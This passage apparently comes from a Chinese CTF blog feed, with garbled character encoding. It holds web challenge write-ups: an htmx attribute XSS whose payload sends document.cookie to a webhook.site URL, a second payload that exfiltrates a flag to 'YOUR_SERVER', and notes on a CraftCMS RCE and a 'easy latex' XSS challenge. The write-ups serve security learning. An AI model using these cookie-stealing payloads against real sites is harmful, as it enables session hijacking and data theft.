class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token function">Ok</span><span class="token punctuation">(</span><span class="token function">Html</span><span class="token punctuation">(</span>fs<span class="token punctuation">:</span><span class="token symbol">:read_to_string</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token string">"Flag missing"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> note<span class="token punctuation">.</span><span class="token function">chars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">any</span><span class="token punctuation">(</span><span class="token operator">|</span>c<span class="token operator">|</span> <span class="token operator">!</span>c<span class="token punctuation">.</span><span class="token function">is_ascii_hexdigit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">Err</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token constant">StatusCode</span><span class="token punctuation">:</span><span class="token symbol">:BAD_REQUEST</span><span class="token punctuation">,</span> <span class="token string">"Malformed note ID"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    let <span class="token function">Ok</span><span class="token punctuation">(</span>note<span class="token punctuation">)</span> <span class="token operator">=</span> fs<span class="token punctuation">:</span><span class="token symbol">:read_to_string</span><span class="token punctuation">(</span>format<span class="token operator">!</span><span class="token punctuation">(</span><span class="token string">"public/upload/{:}"</span><span class="token punctuation">,</span> note<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">Err</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token constant">StatusCode</span><span class="token punctuation">:</span><span class="token symbol">:NOT_FOUND</span><span class="token punctuation">,</span> <span class="token string">"Note not found"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token function">Ok</span><span class="token punctuation">(</span><span class="token function">Html</span><span class="token punctuation">(</span>note<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>/upload_note</code>æœ€å…³é”®çš„å°±æ˜¯<code>waf</code>ï¼Œåªè®©ä¸Šä¼ <code>h1 p div</code>è¿™ä¸‰ä¸ªæ ‡ç­¾ï¼Œè¿™ä¸‰ä¸ªæ ‡ç­¾æ­£å¸¸æ¥è¯´æ˜¯æ²¡æ³•<code>xss</code>çš„ã€‚</p><pre class="line-numbers language-ruby"><code class="language-ruby">async fn <span class="token function">upload_note</span><span class="token punctuation">(</span>    mut multipart<span class="token punctuation">:</span> <span class="token constant">Multipart</span><span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token constant">StatusCode</span><span class="token punctuation">,</span> <span class="token constant">Result</span><span class="token operator">&lt;</span><span class="token constant">HeaderMap</span><span class="token operator">&lt;</span><span class="token constant">HeaderValue</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>'static str<span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    let mut body<span class="token punctuation">:</span> <span class="token constant">Option</span><span class="token operator">&lt;</span><span class="token builtin">String</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token constant">None</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> let <span class="token function">Some</span><span class="token punctuation">(</span>field<span class="token punctuation">)</span> <span class="token operator">=</span> multipart<span class="token punctuation">.</span><span class="token function">next_field</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>await<span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        let <span class="token function">Some</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> continue <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> name <span class="token operator">!=</span> <span class="token string">"note"</span> <span class="token punctuation">{</span>            continue<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        let <span class="token function">Ok</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>await <span class="token keyword">else</span> <span class="token punctuation">{</span>            continue<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        body <span class="token operator">=</span> <span class="token function">Some</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    let <span class="token function">Some</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span> <span class="token operator">=</span> body <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token constant">StatusCode</span><span class="token punctuation">:</span><span class="token symbol">:BAD_REQUEST</span><span class="token punctuation">,</span> <span class="token function">Err</span><span class="token punctuation">(</span><span class="token string">"Malformed formdata"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> body<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5000</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token constant">StatusCode</span><span class="token punctuation">:</span><span class="token symbol">:PAYLOAD_TOO_LARGE</span><span class="token punctuation">,</span> <span class="token function">Err</span><span class="token punctuation">(</span><span class="token string">"Note too big"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    let safe <span class="token operator">=</span> ammonia<span class="token punctuation">:</span><span class="token symbol">:Builder</span><span class="token punctuation">:</span><span class="token symbol">:new</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">tags</span><span class="token punctuation">(</span>hashset<span class="token operator">!</span><span class="token punctuation">[</span><span class="token string">"h1"</span><span class="token punctuation">,</span> <span class="token string">"p"</span><span class="token punctuation">,</span> <span class="token string">"div"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">add_generic_attribute_prefixes</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">[</span><span class="token string">"hx-"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">clean</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>body<span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    let mut name <span class="token operator">=</span> <span class="token punctuation">[</span>0u8<span class="token punctuation">;</span> <span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    fs<span class="token punctuation">:</span><span class="token symbol">:File</span><span class="token punctuation">:</span><span class="token symbol">:open</span><span class="token punctuation">(</span><span class="token string">"/dev/urandom"</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">read_exact</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mut name<span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token string">"Failed to read urandom"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    let name <span class="token operator">=</span> <span class="token builtin">String</span><span class="token punctuation">:</span><span class="token symbol">:from_iter</span><span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token operator">|</span>c<span class="token operator">|</span> format<span class="token operator">!</span><span class="token punctuation">(</span><span class="token string">"{:02x}"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    fs<span class="token punctuation">:</span><span class="token symbol">:write</span><span class="token punctuation">(</span>format<span class="token operator">!</span><span class="token punctuation">(</span><span class="token string">"public/upload/{:}"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">,</span> safe<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token string">"Failed to write note"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span>        <span class="token constant">StatusCode</span><span class="token punctuation">:</span><span class="token symbol">:FOUND</span><span class="token punctuation">,</span>        <span class="token function">Ok</span><span class="token punctuation">(</span><span class="token constant">HeaderMap</span><span class="token punctuation">:</span><span class="token symbol">:from_iter</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span>            <span class="token constant">LOCATION</span><span class="token punctuation">,</span>            format<span class="token operator">!</span><span class="token punctuation">(</span><span class="token string">"/note/{:}"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½†è¿™å¥è¯å°±å¾ˆå¥‡æ€ªï¼Œå…è®¸ä¸€ä¸ª<code>hx-</code>å¼€å¤´çš„å±æ€§ã€‚è¿™å±æ€§æˆ‘è¿™è¾ˆå­éƒ½æ²¡è§è¿‡ã€‚</p><pre><code>.add_generic_attribute_prefixes(&amp;[&quot;hx-&quot;])</code></pre><p>ç»ç™¾åº¦å¾—çŸ¥è¿™ä¸ªå±æ€§æ˜¯<code>htmx</code>çš„ä¸œè¥¿ï¼Œç„¶åæˆ‘çœ‹äº†ä¸€ä¸‹<code>html</code>ï¼Œå‘ç°å¥½å¤šé¡µé¢éƒ½å¼•å…¥äº†<code>htmx</code>ã€‚</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://unpkg.com/htmx.org@1.9.5<span class="token punctuation">"</span></span> <span class="token attr-name">integrity</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sha384-xcuj3WpfgjlKF+FXhSQFQ0ZNr39ln+hwjN3npfM9VBnUskLolQAcN80McRIVOPuO<span class="token punctuation">"</span></span> <span class="token attr-name">crossorigin</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>anonymous<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>htmx</code>æ˜¯å•¥:</p><blockquote><p>å…ˆæ¥çœ‹<code>HTML</code>ï¼Œ<code>HTML</code>çš„ä¼˜åŠ¿åœ¨äºï¼Œå®ƒæ˜¯ä¸€ä¸ªå£°æ˜å¼çš„è¯­è¨€ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨htmlä¸­å£°æ˜æˆ‘ä»¬æƒ³è¦çš„æ•ˆæœï¼Œè€Œä¸éœ€è¦å»å†™jsä»£ç ï¼Œè¿™æ ·å°±å¯ä»¥å‡å°‘å¾ˆå¤šçš„ä»£ç é‡ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥å‡å°‘å¾ˆå¤šçš„bugã€‚è€Œä¸”ï¼Œhtmlæ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„è¯­è¨€ï¼Œå¾ˆå¤šäººéƒ½å¯ä»¥å¾ˆå¿«çš„ä¸Šæ‰‹ï¼Œè¿™æ ·ä¹Ÿå¯ä»¥å‡å°‘å¾ˆå¤šçš„å­¦ä¹ æˆæœ¬</p></blockquote><p>å¤§æ¦‚å°±æ˜¯æ ‡ç­¾å°±èƒ½æ‰§è¡Œ<code>js</code>äº†ï¼Œæ‰€ä»¥<a href="https://htmx.org/reference/">è¯»æ–‡æ¡£</a>å°±å¯ä»¥äº†ã€‚<code>htmx:afterRequest</code>åé¢å†™<code>js</code>å°±è¡Œï¼Œä½†æ˜¯éœ€è¦æŒ‡å®š<code>hx-target</code>å’Œ<code>hx-trigger</code>ã€‚</p><p><code>dnslog</code>å‘ç°äº†ä¸€ä¸ªæ›´å¥½ç”¨çš„<a href="https://webhook.site/">webhook</a>ï¼Œæ”¯æŒ<code>https</code>ã€‚</p><pre><code>&lt;div hx-get=&quot;https://awesomenotes.online/&quot; hx-trigger=&quot;load&quot; hx-target=&quot;this&quot;  hx-on=&quot;htmx:afterRequest: fetch(&#39;https://webhook.site/e58effa8-d9d9-48a0-98f2-22a962961c22?a=&#39;+document.cookie)&quot;&gt;Fuck you&lt;/div&gt;</code></pre><p>ç”±äºcookieæ²¡æœ‰è®¾ç½®<code>http only</code>ï¼Œç›´æ¥å·<code>cookie</code>å°±è¡Œï¼Œæ‹¿ç€<code>cookie</code>è®¿é—®å³å¯å¾—åˆ°<code>flag</code>ã€‚</p><p>æœåˆ°ä¸€ä¸ª<code>payload</code>ï¼Œè²Œä¼¼ä¸å¤ªç¨³å®šçš„æ ·å­</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span>     <span class="token attr-name">hx-get</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/api/note/flag?t<span class="token punctuation">=</span><span class="token punctuation">"</span></span>     <span class="token attr-name">hx-trigger</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>load delay:0.001s<span class="token punctuation">"</span></span>    <span class="token attr-name">hx-target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#report<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    get flag<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span>     <span class="token attr-name">hx-get</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>YOUR_SERVER<span class="token punctuation">"</span></span>     <span class="token attr-name"><span class="token namespace">hx-on:</span>:config-request</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>event.detail.parameters[<span class="token punctuation">'</span>flag<span class="token punctuation">'</span>] <span class="token punctuation">=</span> document.getElementById(<span class="token punctuation">'</span>report<span class="token punctuation">'</span>).innerHTML<span class="token punctuation">"</span></span>    <span class="token attr-name">hx-trigger</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>load delay:0.8s<span class="token punctuation">"</span></span>    <span class="token attr-name">hx-target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#report<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    send flag<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACTF2023-webé¢˜è§£</title>
      <link href="/2023/10/31/actf-web/"/>
      <url>/2023/10/31/actf-web/</url>
      
        <content type="html"><![CDATA[<p>è¿™æ¬¡æ¯”èµ›é¢˜éå¸¸æœ‰æ„æ€ï¼Œç”šè‡³å¯ä»¥ç”¨çŒ¥çä¸¤ä¸ªå­—å½¢å®¹ã€‚</p><p><code>web</code>é¢˜æ˜¯å’Œ<code>kkkl@chamd5</code>å¸ˆå‚…ä¸€èµ·åšçš„ï¼Œå¾ˆå¤šæ€è·¯éƒ½æ˜¯ä»–æƒ³å‡ºæ¥çš„ã€‚</p><h4 id="craftcms"><a href="#craftcms" class="headerlink" title="craftcms"></a>craftcms</h4><p>ä¹‹å‰çˆ†å‡ºè¿‡<code>cve</code>ï¼Œå‚è€ƒè¿™ç¯‡ï¼š</p><p><a href="http://www.bmth666.cn/2023/09/26/CVE-2023-41892-CraftCMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">http://www.bmth666.cn/2023/09/26/CVE-2023-41892-CraftCMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p><p>ä½¿ç”¨ç¬¬äºŒç§<code>trick</code>æ‰“æ—¥å¿—åŒ…å«ä¼šè¢«æ£€æµ‹åˆ°ï¼Œè€Œä½¿ç”¨ç¬¬ä¸‰ç§æ–¹æ³•<code>imagemagick</code>æ‰©å±•å†™é©¬åº”è¯¥æ˜¯æ²¡æœ‰æƒé™ï¼Œå†™ä¸è¿›å»<code>web</code>ç›®å½•ã€‚</p><p>è€ƒè™‘ç¬¬ä¸€æ¬¡ç›´æ¥å¤åˆ¶é‡Œé¢çš„æŠ¥æ–‡æ‰“å°±è¡Œï¼Œå¾€<code>/tmp</code>ä¸‹å†™æ–‡ä»¶ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1698682144239.jpg" alt="1698682144239"></p><p>éšåæ–‡ä»¶åŒ…å«å³å¯ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1698682170209.jpg" alt="1698682170209"></p><h4 id="easy-latex"><a href="#easy-latex" class="headerlink" title="easy latex"></a>easy latex</h4><p>è¿™é¢˜çœ‹ä¸Šå»æ˜¯è¦<code>XSS</code>ã€‚å¤§ä½“çœ‹ä¸€éé€»è¾‘å‘ç°<code>theme</code>æ˜¯å¯æ§çš„ï¼Œå¹¶ä¸”æ¸²æŸ“çš„æ—¶å€™æ˜¯é€šè¿‡<code>latex-js</code>æ¥è¿œç¨‹åŠ è½½<code>theme</code>ï¼Œåˆ©ç”¨ç‚¹ä¼°è®¡å°±æ˜¯é€šè¿‡å¯æ§çš„<code>theme</code>è¿›è¡Œ<code>xss</code>ã€‚</p><p>ä¸€å¼€å§‹çœ‹é”™äº†ï¼Œè¿˜ä»¥ä¸ºæ˜¯ä»€ä¹ˆ<code>md5</code>å¼±ç±»å‹ç»•è¿‡ï¼Œä»”ç»†ä¸€çœ‹å°±æ˜¯æŠŠè´¦å·<code>md5</code>ä¹‹åå½“ä½œå¯†ç å°±èƒ½ç™»é™†äº†ã€‚</p><pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> <span class="token punctuation">{</span> username<span class="token punctuation">,</span> password <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span> <span class="token operator">!=</span> password<span class="token punctuation">)</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> msg<span class="token punctuation">:</span> <span class="token string">'login failed'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token punctuation">}</span>    <span class="token keyword">let</span> token <span class="token operator">=</span> <span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">{</span> username<span class="token punctuation">,</span> isVip<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>    res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span>    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="æˆä¸ºvip"><a href="#æˆä¸ºvip" class="headerlink" title="æˆä¸ºvip"></a>æˆä¸ºvip</h5><p>æ—¢ç„¶è¦æƒ³åŠæ³•åˆ©ç”¨<code>theme</code>é‚£ä¹ˆè‚¯å®šè¦æˆä¸º<code>vip</code>äº†ã€‚è¿™é‡Œ<code>url</code>è¿”å›ä¸€ä¸ª<code>ok</code>å°±å¯ä»¥æˆä¸º<code>vip</code>äº†ã€‚æ¯”è¾ƒå¥‡æ€ªçš„æ˜¯ä»–æ˜¯ç”¨<code>new URL(username, vip_url)</code>ä½œä¸º<code>url</code>è¯·æ±‚è®¿é—®çš„ï¼Œæ­£å¸¸æ¥è¯´ç›´æ¥æ ¼å¼åŒ–å­—ç¬¦ä¸²å°±å¥½äº†ï¼Œå¹¶ä¸”è¿™ä¸ª<code>username</code>åœ¨å‰é¢ï¼Œå½“æ—¶å°±è§‰å¾—æ¯”è¾ƒå¯ç–‘ã€‚</p><pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/vip'</span><span class="token punctuation">,</span> auth<span class="token punctuation">,</span><span class="token keyword">async</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> session <span class="token operator">=</span> req<span class="token punctuation">.</span>session    <span class="token keyword">let</span> username <span class="token operator">=</span> session<span class="token punctuation">.</span>username    <span class="token keyword">let</span> <span class="token punctuation">{</span> code <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body    <span class="token keyword">let</span> vip_url <span class="token operator">=</span> VIP_URL    <span class="token keyword">let</span> data <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token punctuation">(</span><span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> vip_url<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>        method<span class="token punctuation">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>        headers<span class="token punctuation">:</span> <span class="token punctuation">{</span>            Cookie<span class="token punctuation">:</span> Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">[</span>k<span class="token punctuation">,</span> v<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>k<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>v<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'; '</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        body<span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token punctuation">{</span> code <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'ok'</span> <span class="token operator">==</span> data<span class="token punctuation">)</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span> <span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">{</span> username<span class="token punctuation">,</span> isVip<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Congratulation! You are VIP now.'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…·ä½“çœ‹<code>URL()</code>çš„é€»è¾‘æˆ–è€…æœ¬åœ°å»è°ƒè¯•éƒ½å¾ˆå®¹æ˜“å‘ç°ï¼šåªè¦ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸ªå®Œæ•´çš„<code>http url</code>å°±ä¼šæŠŠç¬¬äºŒä¸ªå‚æ•°æ— è§†æ‰ã€‚å› æ­¤è‡ªå·±å†™ä¸ªè¿”å›<code>ok</code>çš„ç½‘é¡µå°±èƒ½æˆä¸º<code>vip</code>äº†ã€‚</p><p>ä»¥è¿™ä¸ªæ¶æ„<code>url</code>ä¸ºç”¨æˆ·åç™»é™†å³å¯æˆä¸º<code>vip</code>ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20231031001103195.png" alt="image-20231031001103195"></p><h5 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h5><p><code>XSS</code>è¿™ä¸€æ­¥å°±æœ‰ç‚¹æ¶å¿ƒäº†ã€‚å…¶å®è¿™é‡Œå·²ç»çœ‹åˆ°äº†<code>id</code>æ˜¯å¯æ§çš„ï¼Œä¸ä¸€å®šéè¦è®¿é—®<code>/note</code>ï¼Œä½†æ­¤æ—¶å…‰æƒ³ç€æ€ä¹ˆæ‰“<code>note.html</code>çš„<code>xss</code>äº†ã€‚</p><pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/share/:id'</span><span class="token punctuation">,</span> reportLimiter<span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> <span class="token punctuation">{</span> id <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>params    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>id<span class="token punctuation">)</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'no note id specified'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token punctuation">}</span>    <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token template-string"><span class="token string">`http://localhost:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>PORT<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/note/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>id<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token keyword">await</span> <span class="token function">visit</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'done'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token 